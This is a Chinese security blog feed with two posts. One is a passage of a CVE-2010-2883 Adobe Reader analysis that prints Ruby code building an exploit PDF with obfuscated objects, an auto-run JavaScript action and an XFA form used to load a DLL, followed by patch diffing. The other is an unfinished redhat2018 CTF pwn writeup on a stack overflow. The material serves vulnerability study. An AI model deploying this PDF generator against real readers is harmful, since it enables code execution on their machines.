四字节随机的非ASCII字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># catalog</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">1</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Pages "</span>) &lt;&lt; io_ref(<span class="number">2</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type /Catalog"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/OpenAction "</span>) &lt;&lt; io_ref(<span class="number">11</span>) &lt;&lt; eol</span><br><span class="line">    <span class="comment"># The AcroForm is required to get icucnv36.dll to load</span></span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/AcroForm "</span>) &lt;&lt; io_ref(<span class="number">13</span>) &lt;&lt; eol    <span class="comment"># /AcroForm是为了主程序能够加载icucnv36.dll</span></span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pages array</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">2</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/MediaBox "</span>) &lt;&lt; io_ref(<span class="number">3</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Resources "</span>) &lt;&lt; io_ref(<span class="number">4</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Kids ["</span>) &lt;&lt; io_ref(<span class="number">5</span>) &lt;&lt; <span class="string">"]"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Count 1"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type /Pages"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># media box</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">3</span>)</span><br><span class="line">    pdf &lt;&lt; <span class="string">"[0 0 595 842]"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># resources</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">4</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Font "</span>) &lt;&lt; io_ref(<span class="number">6</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"&gt;&gt;"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># page 1</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">5</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Parent "</span>) &lt;&lt; io_ref(<span class="number">2</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/MediaBox "</span>) &lt;&lt; io_ref(<span class="number">3</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Resources "</span>) &lt;&lt; io_ref(<span class="number">4</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Contents ["</span>) &lt;&lt; io_ref(<span class="number">8</span>) &lt;&lt; n_obfu(<span class="string">"]"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type /Page"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol <span class="comment"># end obj dict</span></span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># font</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">6</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/F1 "</span>) &lt;&lt; io_ref(<span class="number">7</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"&gt;&gt;"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ttf object</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">7</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type /Font"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Subtype /TrueType"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Name /F1"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/BaseFont /Cinema"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Widths []"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/FontDescriptor "</span>) &lt;&lt; io_ref(<span class="number">9</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Encoding /MacRomanEncoding"</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># page content</span></span><br><span class="line">    content = <span class="string">"Hello World!"</span></span><br><span class="line">    content = <span class="string">""</span> +</span><br><span class="line">        <span class="string">"0 g"</span> + eol +</span><br><span class="line">        <span class="string">"BT"</span> + eol +</span><br><span class="line">        <span class="string">"/F1 32 Tf"</span> + eol +</span><br><span class="line">        <span class="string">"32 Tc"</span> + eol +</span><br><span class="line">        <span class="string">"1 0 0 1 32 773.872 Tm"</span> + eol +</span><br><span class="line">        <span class="string">"("</span> + content + <span class="string">") Tj"</span> + eol +</span><br><span class="line">        <span class="string">"ET"</span></span><br><span class="line"></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">8</span>) &lt;&lt; <span class="string">"&lt;&lt;"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Length %s"</span> % content.length) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"&gt;&gt;"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"stream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; content &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"endstream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># font descriptor</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">9</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type/FontDescriptor/FontName/Cinema"</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Flags %d"</span> % (<span class="number">2</span>**<span class="number">2</span> + <span class="number">2</span>**<span class="number">6</span> + <span class="number">2</span>**<span class="number">17</span>))</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/FontBBox [-177 -269 1123 866]"</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/FontFile2 "</span>) &lt;&lt; io_ref(<span class="number">10</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ttf stream</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    compressed = Zlib::Deflate.deflate(ttf) <span class="comment"># 字体数据是通过zlib进行压缩后放入pdf的</span></span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">10</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;/Length %s/Filter/FlateDecode/Length1 %s&gt;&gt;"</span> % [compressed.length, ttf.length]) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"stream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; compressed &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"endstream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># js action</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">11</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;"</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"/Type/Action/S/JavaScript/JS "</span>) + io_ref(<span class="number">12</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># js stream</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    compressed = Zlib::Deflate.deflate(ascii_hex_whitespace_encode(js)) <span class="comment"># javascript代码也是通过zlib进行压缩后放入pdf的</span></span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">12</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;/Length %s/Filter[/FlateDecode/ASCIIHexDecode]&gt;&gt;"</span> % compressed.length) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"stream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; compressed &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"endstream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment">###</span></span><br><span class="line">    <span class="comment"># The following form related data is required to get icucnv36.dll to load</span></span><br><span class="line">    <span class="comment"># 以下表单相关数据是为了让icucnv36.dll得到加载</span></span><br><span class="line">    <span class="comment">###</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># form object</span></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">13</span>)</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&lt;&lt;/XFA "</span>) &lt;&lt; io_ref(<span class="number">14</span>) &lt;&lt; n_obfu(<span class="string">"&gt;&gt;"</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment"># form stream</span></span><br><span class="line">    xfa = <span class="string">&lt;&lt;-EOF</span></span><br><span class="line"><span class="string">    &lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="string">    &lt;xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"&gt;</span></span><br><span class="line"><span class="string">    &lt;config xmlns="http://www.xfa.org/schema/xci/2.6/"&gt;</span></span><br><span class="line"><span class="string">    &lt;present&gt;&lt;pdf&gt;&lt;interactive&gt;1&lt;/interactive&gt;&lt;/pdf&gt;&lt;/present&gt;</span></span><br><span class="line"><span class="string">    &lt;/config&gt;</span></span><br><span class="line"><span class="string">    &lt;template xmlns="http://www.xfa.org/schema/xfa-template/2.6/"&gt;</span></span><br><span class="line"><span class="string">    &lt;subform name="form1" layout="tb" locale="en_US"&gt;</span></span><br><span class="line"><span class="string">    &lt;pageSet&gt;&lt;/pageSet&gt;</span></span><br><span class="line"><span class="string">    &lt;/subform&gt;&lt;/template&gt;&lt;/xdp:xdp&gt;</span></span><br><span class="line"><span class="string">    EOF</span></span><br><span class="line"></span><br><span class="line">    xref &lt;&lt; pdf.length</span><br><span class="line">    pdf &lt;&lt; io_def(<span class="number">14</span>) &lt;&lt; n_obfu(<span class="string">"&lt;&lt;/Length %s&gt;&gt;"</span> % xfa.length) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"stream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; xfa &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"endstream"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; endobj</span><br><span class="line"></span><br><span class="line">    <span class="comment">###</span></span><br><span class="line">    <span class="comment"># end form stuff for icucnv36.dll</span></span><br><span class="line">    <span class="comment">###</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># trailing stuff</span></span><br><span class="line">    xrefPosition = pdf.length</span><br><span class="line">    pdf &lt;&lt; <span class="string">"xref"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"0 %d"</span> % (xref.length + <span class="number">1</span>) &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; <span class="string">"0000000000 65535 f"</span> &lt;&lt; eol</span><br><span class="line">    xref.each <span class="keyword">do</span> <span class="params">|index|</span></span><br><span class="line">        pdf &lt;&lt; <span class="string">"%010d 00000 n"</span> % index &lt;&lt; eol</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    pdf &lt;&lt; <span class="string">"trailer"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; n_obfu(<span class="string">"&lt;&lt;/Size %d/Root "</span> % (xref.length + <span class="number">1</span>)) &lt;&lt; io_ref(<span class="number">1</span>) &lt;&lt; <span class="string">"&gt;&gt;"</span> &lt;&lt; eol</span><br><span class="line"></span><br><span class="line">    pdf &lt;&lt; <span class="string">"startxref"</span> &lt;&lt; eol</span><br><span class="line">    pdf &lt;&lt; xrefPosition.to_s() &lt;&lt; eol</span><br><span class="line"></span><br><span class="line">    pdf &lt;&lt; <span class="string">"%%EOF"</span> &lt;&lt; eol</span><br><span class="line">    pdf</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="0x50-漏洞修复"><a href="#0x50-漏洞修复" class="headerlink" title="0x50 漏洞修复"></a>0x50 漏洞修复</h2><p>&emsp;&emsp;我下载了<code>Adobe Reader v9.4.0</code>版本,安装好后,提取出了其中的<code>CoolType.dll</code>模块。<code>Adobe Reader v9.3.4</code>中<code>CoolType.dll</code>的版本是<code>v5.5.72.1</code>,<code>Adobe Reader v9.4.0</code>中<code>CoolType.dll</code>的版本是<code>v5.5.73.1</code>。通过<code>BinDiff</code>进行对比后,结果如下：</p><div align="left"><img src="/resources/2018/2018-06-01-05.jpg" width="80%" height="70%" alt="BinDiff结果"></div><p>&emsp;&emsp;其中<code>strcat()</code>函数被<code>sub_813391E()</code>函数替换,我们进入sub_813391E()函数,看看是怎样验证<code>uniqueName字段</code>长度的：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sub_813391E(&amp;uniqueName_buf, (<span class="keyword">char</span> *)(v22 + <span class="number">16</span>), <span class="number">260</span>);</span><br><span class="line">sub_8001243(&amp;uniqueName_buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">sub_813391E</span><span class="params">(<span class="keyword">char</span> *uniqueName_buf, <span class="keyword">char</span> *uniqueName_str, <span class="keyword">int</span> max_length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> len; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax@2</span></span><br><span class="line"></span><br><span class="line">  len = <span class="built_in">strlen</span>(uniqueName_buf);                 <span class="comment">// 如果uniqueName_buf已经有了字符串,先计算其长度</span></span><br><span class="line">  <span class="keyword">if</span> ( max_length &gt; len )                       <span class="comment">// 判断字符串长度是否超过最大值,max_length=0x104=260</span></span><br><span class="line">    <span class="comment">// 将pdf中uniqueName字段的内容复制到缓冲区中已有的字符串之后,长度之和不能超过260字节</span></span><br><span class="line">    result = <span class="built_in">strncat</span>(&amp;uniqueName_buf[len], uniqueName_str, max_length - len - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = uniqueName_buf;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//************************************************************************************************//</span></span><br><span class="line"><span class="comment">//函数原型：char *strncat(char *dest, const char *src, size_t n)                                   //</span></span><br><span class="line"><span class="comment">//函数功能：从*src复制n个字节到*dest                                                                //</span></span><br><span class="line"><span class="comment">//函数参数：dest -- 指向目标数组，该数组包含了一个 C 字符串，且足够容纳追加后的字符串，包括额外的空字符。 //</span></span><br><span class="line"><span class="comment">//         src -- 要追加的字符串。                                                                 //</span></span><br><span class="line"><span class="comment">//         n -- 要追加的最大字符数。                                                               //</span></span><br><span class="line"><span class="comment">//函数返回值：该函数返回一个指向最终的目标字符串 dest 的指针。                                        //</span></span><br><span class="line"><span class="comment">//************************************************************************************************//</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;我们可以看到<code>sub_813391E()</code>函数首先查看<code>uniqueName在栈上的缓冲区</code>是否<code>已经有字符串存在</code>,并通过<code>strlen()</code>计算其长度。如果长度小于<code>260</code>,则通过<code>strncat()</code>函数将pdf中的字体数据中的SING表的<code>uniqueName字段</code>的内容复制到栈上缓冲区中<code>已经存在的字符串</code>后面,并且<code>复制长度</code>与缓冲区中<code>已经存在的字符串</code>的<code>长度之和</code>不能超过<code>260</code>字节。</p><p>&emsp;&emsp;到此为止，这个漏洞的分析暂告一段落，后面搞清楚了一些没搞清楚的细节，再来补充。</p><h2 id="0x60-Reference"><a href="#0x60-Reference" class="headerlink" title="0x60 Reference"></a>0x60 Reference</h2><blockquote><ul><li>1.<a href="http://ahageek.com/writer/migration/cve-2010-2883/" target="_blank" rel="noopener">Aha Geek:CVE-2010-2883 Analysis</a></li><li>2.<a href="https://bbs.pediy.com/thread-121986.htm" target="_blank" rel="noopener">看雪仙果:千年等一回-Adobe Reader CoolType库TTF字体解析栈溢出漏洞分析</a></li><li>3.<a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201009-077" target="_blank" rel="noopener">国家信息安全漏洞库:Adobe Reader和Acrobat CoolType.dll栈缓冲区溢出漏洞</a></li><li>4.<a href="https://zh.wikipedia.org/wiki/%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%96%87%E6%A1%A3%E6%A0%BC%E5%BC%8F" target="_blank" rel="noopener">维基百科:PDF</a></li><li>5.0day安全:软件漏洞分析技术 30.2 PDF文档格式简介</li><li>6.漏洞战争:软件漏洞分析精要 2.3 CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞</li><li>7.C++反汇编与逆向分析技术揭秘 第9、10、11章</li><li>8.<a href="https://bbs.pediy.com/thread-257172.htm" target="_blank" rel="noopener">CVE-2010-2883漏洞分析 - 21Gun5</a></li><li>9.<a href="https://www.freebuf.com/articles/system/150474.html" target="_blank" rel="noopener">用TEB结构实现ShellCode的通用性</a></li><li>10.<a href="https://bbs.ichunqiu.com/thread-8849-1-1.html?from=ch" target="_blank" rel="noopener">CVE-2010-2883漏洞分析 - k0shl</a></li></ul></blockquote>]]></content>
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stack Overflow </tag>
            
            <tag> Windows </tag>
            
            <tag> FileFormat </tag>
            
            <tag> Adobe Reader </tag>
            
            <tag> Pdf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>redhat2018—writeup</title>
      <link href="/2018/05/27/redhat2018%E2%80%94writeup/"/>
      <url>/2018/05/27/redhat2018%E2%80%94writeup/</url>
      <content type="html"><![CDATA[<blockquote><p>刷题刷题，考试暂告一段落。这篇博客主要记录redhat2018中的pwn题和reverse题的分析过程。reverse还没有训练，后期再补。<br><a id="more"></a></p></blockquote><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="game-server"><a href="#game-server" class="headerlink" title="game server"></a>game server</h3><h4 id="0x00-file-amp-checksec"><a href="#0x00-file-amp-checksec" class="headerlink" title="0x00 file&amp;checksec"></a>0x00 file&amp;checksec</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file game_server</span><br><span class="line">game_server: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=f2edc9b459a64a0a5d698157da465036f722679e, stripped</span><br><span class="line">$ checksec game_server</span><br><span class="line">[*] <span class="string">'/home/.../pwn/redhat2018/game_server/game_server'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>通过<code>file</code>命令可以看到这是一个<code>32bit</code>的ELF，<code>动态链接</code>，并且<code>去除了符号表</code>。通过<code>checksec</code>命令可以看到程序开启了<code>NX</code>，所以一般需要用到<code>ret2libc</code>.</p><h4 id="0x01-IDA分析程序逻辑"><a href="#0x01-IDA分析程序逻辑" class="headerlink" title="0x01 IDA分析程序逻辑"></a>0x01 IDA分析程序逻辑</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  sub_8048637();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Now you can start you game in middle earth"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到主函数里面只有一个自定义函数，逻辑一定在这里面了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048637</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+7h] [bp-111h]@5</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [sp+107h] [bp-11h]@5</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [sp+108h] [bp-10h]@5</span></span><br><span class="line">  <span class="keyword">char</span> *len; <span class="comment">// [sp+10Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to my game server"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"First, you need to tell me you name?"</span>);</span><br><span class="line">  fgets(name_buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  len = <span class="built_in">strrchr</span>(name_buf, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">    *len = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, name_buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's you occupation?"</span>);</span><br><span class="line">  fgets(occupation_buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  len = <span class="built_in">strrchr</span>(occupation_buf, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">    *len = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Well, my noble %s\n"</span>, occupation_buf);</span><br><span class="line">  nbytes = <span class="built_in">snprintf</span>(</span><br><span class="line">             &amp;s,</span><br><span class="line">             <span class="number">256u</span>,</span><br><span class="line">             <span class="string">"Our %s is a noble %s. He is come from north and well change out would."</span>,</span><br><span class="line">             name_buf,</span><br><span class="line">             occupation_buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Here is you introduce"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to edit you introduce by yourself?[Y/N]"</span>);</span><br><span class="line">  v2 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="string">'Y'</span> )                              <span class="comment">// Y</span></span><br><span class="line">    read(<span class="number">0</span>, &amp;s, nbytes);                        <span class="comment">// 存在溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"name : %s\noccupation : %s\nintroduce : %s\n"</span>, name_buf, occupation_buf, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，首先需要我们输入<code>name</code>和<code>occupation</code>信息，再往后看，可以看到<code>snprintf()</code>函数,这是一个需要注意的点。先来看一下snprintf()函数的原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">****************************<span class="built_in">snprintf</span>()原型*******************************</span><br><span class="line"><span class="number">1.</span> *str 这是存放结果字符串的字符数组指针</span><br><span class="line"><span class="number">2.</span> size （<span class="number">1</span>）如果格式化后的字符串长度 &lt; size，则将此字符串全部复制到str中，并给</span><br><span class="line">        其后添加一个字符串结束符(<span class="string">'\0'</span>)；</span><br><span class="line">        （<span class="number">2</span>）如果格式化后的字符串长度 &gt;= size，则只将其中的(size<span class="number">-1</span>)个字符复制到</span><br><span class="line">        str中，并给其后添加一个字符串结束符(<span class="string">'\0'</span>)，返回值为欲写入的字符串长度。</span><br><span class="line"><span class="number">3.</span> *format 格式化字符串</span><br><span class="line"><span class="number">4.</span> ... 参数的个数是不确定的</span><br><span class="line"><span class="number">5.</span> 返回值 若成功则返回预写入的字符串长度，若出错则返回负值。</span><br><span class="line"><span class="number">6.</span> 头文件 #include &lt;stdio.h&gt;</span><br><span class="line">*************************************************************************</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">snprintf</span>(<span class="keyword">char</span> *str, <span class="keyword">size_t</span> size, <span class="keyword">const</span> <span class="keyword">char</span> *format, 